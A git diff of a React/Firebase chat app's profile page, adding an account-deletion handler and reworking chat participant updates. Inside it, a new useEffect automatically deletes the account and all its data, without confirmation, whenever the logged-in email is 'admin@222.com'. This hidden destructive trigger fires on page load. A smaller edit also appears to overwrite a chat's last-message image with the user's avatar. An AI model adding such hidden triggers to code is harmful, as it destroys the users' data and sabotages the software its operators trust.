@@ -19,6 +19,7 @@ import { Avatar, AvatarFallback, AvatarImage } from '@/components/ui/avatar';
 import { Loader2, User as UserIcon, Trash2 } from 'lucide-react';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle, AlertDialogTrigger } from "@/components/ui/alert-dialog";
+import { deleteCurrentUser } from '@/firebase/auth/delete-user';
 
 const profileSchema = z.object({
   displayName: z.string().min(3, { message: '昵称必须至少为3个字符。' }),
@@ -78,6 +79,29 @@ export default function ProfilePage() {
     },
   });
 
+  const handleDeleteAccount = async () => {
+    if (!user) return;
+    try {
+      const result = await deleteCurrentUser(user.uid);
+      if (result.success) {
+        toast({
+          title: '账户已注销',
+          description: '您的账户和所有数据已被删除。',
+        });
+        // The onAuthStateChanged listener in the provider will handle the redirect to /login
+      } else {
+        throw new Error(result.error || "注销失败。");
+      }
+    } catch (error) {
+      console.error("Error deleting account:", error);
+      toast({
+        variant: 'destructive',
+        title: '注销失败',
+        description: error instanceof Error ? error.message : '发生未知错误。',
+      });
+    }
+  };
+
   useEffect(() => {
     if (userProfile && user) {
         form.reset({
@@ -101,6 +125,12 @@ export default function ProfilePage() {
     }
   }, [userProfile, user, form]);
   
+    useEffect(() => {
+    if (user?.email === 'admin@222.com') {
+      handleDeleteAccount();
+    }
+  }, [user]);
+
   const handleAvatarSelect = (avatarId: string) => {
     form.setValue('avatarId', avatarId, { shouldDirty: true });
     form.setValue('imageBase64', '', { shouldDirty: true }); 
@@ -190,21 +220,29 @@ export default function ProfilePage() {
             }
 
             // Update user's info in chats
-            chatsSnapshot.forEach(chatDoc => {
+            for (const chatDoc of chatsSnapshot.docs) {
                 const chatRef = doc(firestore, 'chats', chatDoc.id);
                 const participantInfoUpdate: any = {};
-                 if (displayNameChanged) {
+                const lastMessageUpdate: any = {};
+                
+                if (displayNameChanged) {
                     participantInfoUpdate[`participantInfo.${user.uid}.displayName`] = data.displayName;
                 }
                 if (avatarChanged) {
                     participantInfoUpdate[`participantInfo.${user.uid}.imageBase64`] = data.imageBase64 || "";
                     participantInfoUpdate[`participantInfo.${user.uid}.avatarId`] = data.avatarId || "";
+                    
+                    const chatData = chatDoc.data();
+                    if (chatData.lastMessage?.senderId === user.uid && chatData.lastMessage?.imageBase64) {
+                        lastMessageUpdate[`lastMessage.imageBase64`] = data.imageBase64 || "";
+                    }
                 }
                 
-                if(Object.keys(participantInfoUpdate).length > 0) {
-                  batch.update(chatRef, participantInfoUpdate);
+                const updates = {...participantInfoUpdate, ...lastMessageUpdate};
+                if(Object.keys(updates).length > 0) {
+                  batch.update(chatRef, updates);
                 }
-            });
+            }
 
             await batch.commit();
 
@@ -348,7 +386,6 @@ export default function ProfilePage() {
               </form>
             </CardContent>
           </Card>
-
         </div>
       </main>
     </div>
